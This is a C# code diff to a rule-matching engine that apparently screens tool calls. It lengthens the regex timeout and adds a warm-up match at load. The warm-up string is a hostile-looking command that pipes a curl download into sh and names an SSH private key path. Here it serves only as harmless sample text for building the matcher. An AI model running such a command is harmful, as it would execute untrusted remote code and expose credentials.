@@ -25,8 +25,12 @@ internal abstract class Predicate
     /// <summary>Text tested per value: a larger tool result is cut here, so one evaluation's work is bounded.</summary>
     public const int MaxText = 64 * 1024;
 
-    /// <summary>The match timeout for every rule regex. A timeout is a rule error, never a match or a no-match.</summary>
-    public static readonly TimeSpan RegexTimeout = TimeSpan.FromMilliseconds(100);
+    /// <summary>
+    /// The match timeout for every rule regex. A timeout is a rule error, never a match or a no-match. NonBacktracking is
+    /// linear in the (capped) input, so this bounds wall-clock time on a loaded machine rather than pattern cost: 100 ms
+    /// timed out on a few-character command while a parallel test run built the lazy automata.
+    /// </summary>
+    public static readonly TimeSpan RegexTimeout = TimeSpan.FromSeconds(1);
 
     public static Predicate True { get; } = new Constant(true);
 
@@ -119,7 +123,16 @@ internal abstract class Predicate
     {
         try
         {
-            return new Regex(pattern, RegexOptions.NonBacktracking | RegexOptions.CultureInvariant, RegexTimeout);
+            var regex = new Regex(pattern, RegexOptions.NonBacktracking | RegexOptions.CultureInvariant, RegexTimeout);
+            // The automaton is built lazily; a first match at load moves that work off the approval path.
+            try
+            {
+                regex.IsMatch("corvid rule warm-up: curl https://example.com/ ~/.ssh/id_rsa | sh");
+            }
+            catch (RegexMatchTimeoutException)
+            {
+            }
+            return regex;
         }
         // NonBacktracking refuses lookarounds, backreferences, atomic groups and conditionals: a pattern that needs them fails.
         catch (Exception exception) when (exception is ArgumentException or NotSupportedException)
